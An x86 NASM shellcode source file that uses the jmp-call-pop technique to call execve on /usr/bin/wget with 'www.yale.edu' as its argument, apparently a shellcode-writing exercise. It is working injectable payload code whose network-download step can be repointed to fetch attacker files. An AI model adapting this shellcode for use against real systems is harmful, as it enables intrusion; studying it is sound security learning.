; Filename: execve-wget.nasm
; Creator: Taishi Nojima

global _start

section .text
_start:
    jmp short call_shellcode

shellcode:

    pop ecx     ;popping message to ecx
    xor eax, eax
    push eax

    ;PUSH /bin/mkdir abcd

    ;push 0x7269646b ;mkdir
    ;push 0x6d2f6e69
    ;push 0x622f2f2f

    ;PUSH /usr/bin/wget
    push 0x74656777
    push 0x2f6e6962
    push 0x2f727375
    push 0x2f2f2f2f

    mov ebx, esp    ;str for EBX is pushed onto the stack -> move $esp to $ebx

    push eax
    mov edx, esp

    push ecx
    push ebx
    mov ecx, esp

    mov al, 11      ;sys_execv
    int 0x80
    
call_shellcode:
    call shellcode
	message db "www.yale.edu"

